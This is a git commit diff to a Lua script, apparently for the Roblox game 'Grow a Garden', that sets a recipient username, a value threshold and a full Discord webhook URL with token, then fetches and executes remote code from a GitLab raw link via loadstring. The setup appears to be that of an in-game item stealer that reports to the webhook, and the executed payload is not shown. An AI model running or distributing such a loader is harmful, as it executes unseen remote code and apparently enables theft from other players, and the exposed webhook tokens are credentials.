3a05379e9a2bd358857ed150820be13b84ed8734
k0sowa <kaitoyoshiro5@gmail.com>
2025-06-24 09:52:28 +0800

    GaG.lua

--- GaG.lua
+++ GaG.lua
@@ -1,5 +1,6 @@
 Username = "k0sowa"
-Webhook = "https://discord.com/api/webhooks/1386526405851877518/TiNsKEFY0C0mTcYZrn6LQPGLrc5eJtVgV3QgDf73107KMzOjiJCbVzPuSsQdB3kiPLR4"
+Webhook =
+"https://discord.com/api/webhooks/1386886094250967180/KmaeZw-SReCMU6-9hrgoNyd-iZU1tOJJhPdDAB2N2jearZRXLzRr9WTGHFvHOysUbbgl"
 MinimumValue = 1
 
 loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
